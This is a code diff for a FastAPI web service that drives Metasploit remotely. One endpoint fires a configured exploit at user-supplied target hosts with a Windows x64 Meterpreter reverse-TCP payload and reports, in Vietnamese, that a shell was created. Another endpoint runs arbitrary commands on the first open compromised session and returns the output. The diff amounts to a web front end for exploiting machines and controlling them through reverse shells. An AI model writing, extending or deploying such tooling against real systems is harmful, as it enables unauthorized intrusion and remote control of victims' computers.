@@ -3,6 +3,7 @@ from fastapi import FastAPI, APIRouter, Request
 from core.config import settings
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
+import asyncio
 from meta.meta import client, exploit
 
 app = FastAPI(title=settings.PROJECT_NAME)
@@ -41,15 +42,20 @@ async def run_module_exploit(exploit_option: Exploit):
     rhosts = exploit_option.rhosts
     exploit['RHOSTS'] = rhosts
     result = exploit.execute(payload='windows/x64/meterpreter/reverse_tcp')
-    return result
+    if len(client.sessions.list) > 0:
+        return {"message": "Tao shell thanh cong", "data":result}
 
 @router.post('/command', summary="send command")
-def create_control_command(command: RemoteCode):
+async def create_control_command(command: RemoteCode):
     if command.message and client.sessions.list:
-        shell = client.sessions.session(list(client.sessions.list.keys())[0])
         command = command.message
-        shell.write(command)
-        return shell.read()
+        shell = client.sessions.session(list(client.sessions.list.keys())[0])
+        if command and shell:
+            result = shell.run_with_output(command)
+            if result:
+                lines_result = result.splitlines()
+                return lines_result
+        return "Thuc hien cau lenh that bai"
         
 @router.post('/delete', summary="Stop shell")
 def stop_shell_session():
